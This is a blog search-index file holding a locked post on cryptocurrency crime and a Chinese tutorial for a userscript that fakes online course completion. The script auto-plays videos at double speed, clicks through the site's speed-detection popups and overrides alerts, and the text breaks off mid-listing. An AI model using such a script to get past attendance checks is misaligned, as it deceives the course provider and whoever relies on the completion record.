<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>虚拟货币犯罪研究与实战</title>
    <url>/2024/08/05/Cryptocurrency/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="0166c0ea72bbba8d90846d832caa751c541872aab265ee587454cc42e716da05"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>虚拟币犯罪基础与实战应用</tag>
      </tags>
  </entry>
  <entry>
    <title>js刷课脚本实践</title>
    <url>/2024/08/01/jsScript/</url>
    <content><![CDATA[<p>某天拿到了一个刷课的网站，需要帮忙刷一下课，但是呢这个网站</p>
<ul>
<li>打开之后不自动播放</li>
<li>播放完一个视频不会自动播放下一个</li>
<li>不能直接倍速</li>
<li>不能拖动（这个解决不了QAQ）</li>
<li>检测出倍速需要点击弹出框来关闭，从而继续刷课</li>
<li>切换一个课程后有时候会弹出一个alert点击来播放视频</li>
</ul>
<p>嗯……就这么多破事儿</p>
<span id="more"></span>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>油猴（篡改猴）扩展程序</p>
<h3 id="自动播放视频"><a href="#自动播放视频" class="headerlink" title="自动播放视频"></a>自动播放视频</h3><p>一开始的思路是直接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">play</span></span><br></pre></td></tr></table></figure>

<p>让视频播放。</p>
<p>但是在网页的控制台中这个方法可以，但是写到油猴脚本里没法运行，还是不能播放视频。因此使用浏览器模拟点击的方法。</p>
<p>在点击之前，首先要找到video视频标签，这个网页的video元素使用的应该是用js动态加载出来的，所以监听页面加载完毕的方法判断video元素加载到了页面上不太好用（实际上确实不咋好用），于是使用递归查找video元素</p>
<h4 id="查找页面中的video元素"><a href="#查找页面中的video元素" class="headerlink" title="查找页面中的video元素"></a>查找页面中的video元素</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查页面内是否有video元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 延时100毫秒再次检查</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(hasVideo, <span class="number">500</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;再次检查&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 判断video元素内的视频是否在播放</span></span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (currentVideo.<span class="property">paused</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频未播放，开始自动播放...&#x27;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">checkVideoPlaying</span>();</span><br><span class="line">            &#125;, <span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果视频未开始播放，那就调用<code>checkVideoPlaying();</code>函数</p>
<h4 id="检查视频是否未播放"><a href="#检查视频是否未播放" class="headerlink" title="检查视频是否未播放"></a>检查视频是否未播放</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查视频是否在播放</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkVideoPlaying</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//console.log(&#x27;checkVideoPlaying调用&#x27;);</span></span><br><span class="line">    <span class="comment">//const currentVideo = document.querySelector(&#x27;video&#x27;);</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// document.querySelector(&#x27;video&#x27;).play() </span></span><br><span class="line">        <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频开始播放&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">checkPlaybackRate</span>();<span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模拟点击一下video元素"><a href="#模拟点击一下video元素" class="headerlink" title="模拟点击一下video元素"></a>模拟点击一下video元素</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClickOnVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (video) &#123;</span><br><span class="line">        <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">            <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        video.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 video 元素&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 video 元素&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="倍速"><a href="#倍速" class="headerlink" title="倍速"></a>倍速</h3><p>在<strong>检查视频是否未播放</strong>的时候，里面写了一个函数，<code>checkPlaybackRate();</code>检测视频是否为2倍速播放</p>
<p>先让视频两倍速播放，如果不是两倍速重新检查</p>
<p>网站支持两倍速，但是有时候他还是会检测出倍速然后暂停…………解决方法见<a href="#jump1">6. 浏览器模拟点击弹出的按钮</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkPlaybackRate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">playbackRate</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (currentVideo.<span class="property">playbackRate</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2倍速播放成功&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(checkPlaybackRate, <span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkCourseLearned</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="学完自动播放下一个视频"><a href="#学完自动播放下一个视频" class="headerlink" title="学完自动播放下一个视频"></a>学完自动播放下一个视频</h3><h4 id="检测是否学完"><a href="#检测是否学完" class="headerlink" title="检测是否学完"></a>检测是否学完</h4><p>这里就要按照这个网站的特征来分析了</p>
<p><img src="/2024/08/01/jsScript/image-20240801234544151.png" alt="image-20240801234544151"></p>
<p>把鼠标放在这个对钩上面发现显示出了“已学完”</p>
<p><img src="/2024/08/01/jsScript/image-20240801234701881.png" alt="image-20240801234701881"></p>
<p>这样的是“进行中”</p>
<p><img src="/2024/08/01/jsScript/image-20240801234727101.png" alt="image-20240801234727101"></p>
<p>这样的是“未开始”</p>
<p>所以从这里入手分析</p>
<p><img src="/2024/08/01/jsScript/image-20240801234849537.png" alt="image-20240801234849537"></p>
<p>选中这个元素发现里面有一个<code>&lt;i&gt;</code>标签，里面的<code>title</code>是进行中，所以就判断这个<code>title</code>是不是已学完就可以了</p>
<p>同时发现正在播放的视频这里有一个active，没有播放的视频没有这个带active的类，所以就寻找这个带active的类，看这个类下面的<code>&lt;i&gt;</code>标签中的title是否是“已学完”。</p>
<p><img src="/2024/08/01/jsScript/image-20240801235841750.png" alt="image-20240801235841750"></p>
<p><img src="/2024/08/01/jsScript/image-20240802000239250.png" alt="image-20240802000239250"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测本节课是否学过</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkCourseLearned</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkCourseLearned调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 查找所有具有指定类名的元素</span></span><br><span class="line">    <span class="keyword">const</span> items = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历这些元素</span></span><br><span class="line">    items.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 查找 &lt;i&gt; 标签</span></span><br><span class="line">        <span class="keyword">const</span> iElement = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查 &lt;i&gt; 标签的 title 属性是否为 &quot;已学完&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (iElement &amp;&amp; iElement.<span class="property">title</span> === <span class="string">&#x27;已学完&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;找到一个已学完的资源项:&#x27;</span>, item);</span><br><span class="line">            <span class="comment">// 如果这节课学完了，就播放下一节课</span></span><br><span class="line">            <span class="title function_">playNextVideo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果这节课没学完，监听视频播放结束事件</span></span><br><span class="line">            <span class="title function_">listenVideoEnd</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="监听视频是否播放完"><a href="#监听视频是否播放完" class="headerlink" title="监听视频是否播放完"></a>监听视频是否播放完</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 监听视频播放结束事件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">listenVideoEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listenVideoEnd调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">    currentVideo.<span class="title function_">addEventListener</span>(<span class="string">&#x27;ended&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频播放结束，正在尝试播放下一个视频...&#x27;</span>);</span><br><span class="line">        <span class="title function_">playNextVideo</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="播放下一个视频"><a href="#播放下一个视频" class="headerlink" title="播放下一个视频"></a>播放下一个视频</h4><p>首先要找到当前激活的项<code>const activeItem = document.querySelector(&#39;.resource-item.resource-item-train.resource-item-active&#39;);</code>，然后找到下一个没有激活的项，也就是<code>.resource-item.resource-item-train</code>，找到之后就点击这个项</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 播放下一个视频</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">playNextVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;playNextVideo调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 找到当前激活的资源项</span></span><br><span class="line">    <span class="keyword">const</span> activeItem = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!activeItem) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到当前激活的资源项&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(activeItem)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到下一个资源项</span></span><br><span class="line">    <span class="keyword">let</span> nextItem = activeItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">    <span class="keyword">while</span> (nextItem &amp;&amp; (!nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item&#x27;</span>) || !nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item-train&#x27;</span>))) &#123;</span><br><span class="line">        nextItem = nextItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!nextItem) &#123;</span><br><span class="line">        <span class="comment">// 如果已经是最后一个，循环回到第一个</span></span><br><span class="line">        nextItem = activeItem.<span class="property">parentNode</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextItem) &#123;</span><br><span class="line">        <span class="comment">// 模拟点击下一个资源项</span></span><br><span class="line">        <span class="title function_">simulateClick</span>(nextItem, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// 延时处理alert并播放视频</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(handleAlertAndPlayVideo, <span class="number">3000</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到下一个资源项或资源项不符合条件&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">hasVideo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 模拟点击</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClick</span>(<span class="params">element, callback</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;view&#x27;</span>: <span class="variable language_">window</span>,</span><br><span class="line">        <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    element.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">    <span class="comment">// 如果需要执行回调函数，确保点击事件处理完毕后执行</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(callback, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="处理alert"><a href="#处理alert" class="headerlink" title="处理alert"></a>处理alert</h3><p>这个可能不会生效……所以后面又写了一个直接浏览器模拟点击按钮的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理alert并播放视频</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleAlertAndPlayVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 这里假设alert是点击后弹出的，并且需要用户确认</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">alert</span>) &#123;</span><br><span class="line">        <span class="comment">// 模拟点击alert的确定按钮</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span> (<span class="params">message</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击alert确定按钮&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="浏览器模拟点击弹出的按钮"><a href="#浏览器模拟点击弹出的按钮" class="headerlink" title="浏览器模拟点击弹出的按钮"></a><span id="jump1">浏览器模拟点击弹出的按钮</span></h3><p><img src="/2024/08/01/jsScript/image-20240802001050196.png" alt="image-20240802001050196"></p>
<p>经分析，所有的弹出按钮都有这个类</p>
<p>但是运行的时候发现，一打开脚本就跳转到搜索界面，所以肯定是某个搜索的地方也有这个类</p>
<p><img src="/2024/08/01/jsScript/image-20240802001320139.png" alt="image-20240802001320139"></p>
<p>果不其然，这个搜索图标也使用了这个类，所以再排除这个<code>fish-input-search-button</code>类就好了</p>
<blockquote>
<p>这里是怎么发现的呢…………本来这个课是放在虚拟机里刷的，因为不能离开这个网页，所以网页比例就没调，但是在某一瞬间缩小了一下比例，本来是只有一个搜索按钮的地方突然变出来一个搜索框，由于之前比例太大这个搜索框没显示，但是现在显示了，所以多了这么一个类，于是就需要排除这个类</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClickOnPrimaryButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.fish-btn.fish-btn-primary&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (button) &#123;</span><br><span class="line">        <span class="keyword">const</span> classList = button.<span class="property">classList</span>;</span><br><span class="line">        <span class="keyword">if</span> (classList.<span class="title function_">contains</span>(<span class="string">&#x27;fish-input-search-button&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;按钮包含 fish-input-search-button 类，不进行点击&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">            button.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="播放完的Bug"><a href="#播放完的Bug" class="headerlink" title="播放完的Bug"></a>播放完的Bug</h3><p>有时候视频播放完会出来一个Bug，就是视频不自动暂停，这时候如果用鼠标点一下暂停键，脚本才会检测到video.ended，所以再加一个判断，判断视频已播放时长是否等于总时长</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断视频播放时长是否等于总时长</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isVideoDurationEqual</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (video) &#123;</span><br><span class="line">        <span class="keyword">const</span> currentTime = video.<span class="property">currentTime</span>;</span><br><span class="line">        <span class="keyword">const</span> duration = video.<span class="property">duration</span>;</span><br><span class="line">        <span class="keyword">const</span> tolerance = <span class="number">1</span>; <span class="comment">// 允许的误差范围，单位为秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(currentTime - duration) &lt;= tolerance) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;视频播放时长等于总时长&#x27;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 点击video元素，触发视频暂停</span></span><br><span class="line">                <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">            &#125;, <span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="持续执行的函数"><a href="#持续执行的函数" class="headerlink" title="持续执行的函数"></a>持续执行的函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(simulateClickOnPrimaryButton, <span class="number">3000</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(checkPlaybackRate, <span class="number">3000</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(isVideoDurationEqual, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>这三个函数让他每隔三秒重复执行就好了。其他的整个代码逻辑使用递归的方法让整个脚本持续运行</p>
<h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         AutoPlay</span></span><br><span class="line"><span class="comment">// @namespace    https://creeeeeeeeeeper.github.io/</span></span><br><span class="line"><span class="comment">// @version      1.0</span></span><br><span class="line"><span class="comment">// @description  Automatically play the next video in the video list.</span></span><br><span class="line"><span class="comment">// @author       ZYG</span></span><br><span class="line"><span class="comment">// @match        *://*/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// @run-at       document-idle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Autoplay js start&#x27;</span>);</span><br><span class="line">    <span class="title function_">hasVideo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">playv</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="title function_">play</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setInterval</span>(playv, <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(simulateClickOnPrimaryButton, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(checkPlaybackRate, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(isVideoDurationEqual, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClickOnPrimaryButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.fish-btn.fish-btn-primary&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (button) &#123;</span><br><span class="line">            <span class="keyword">const</span> classList = button.<span class="property">classList</span>;</span><br><span class="line">            <span class="keyword">if</span> (classList.<span class="title function_">contains</span>(<span class="string">&#x27;fish-input-search-button&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;按钮包含 fish-input-search-button 类，不进行点击&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                    <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">                &#125;);</span><br><span class="line">                button.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查页面内是否有video元素</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hasVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 延时100毫秒再次检查</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(hasVideo, <span class="number">500</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;再次检查&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 判断video元素内的视频是否在播放</span></span><br><span class="line">            <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (currentVideo.<span class="property">paused</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频未播放，开始自动播放...&#x27;</span>);</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">checkVideoPlaying</span>();</span><br><span class="line">                &#125;, <span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查视频是否在播放</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkVideoPlaying</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkVideoPlaying调用&#x27;</span>);</span><br><span class="line">        <span class="comment">//const currentVideo = document.querySelector(&#x27;video&#x27;);</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// document.querySelector(&#x27;video&#x27;).play() </span></span><br><span class="line">            <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频开始播放&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">200</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">checkPlaybackRate</span>();<span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClickOnVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span 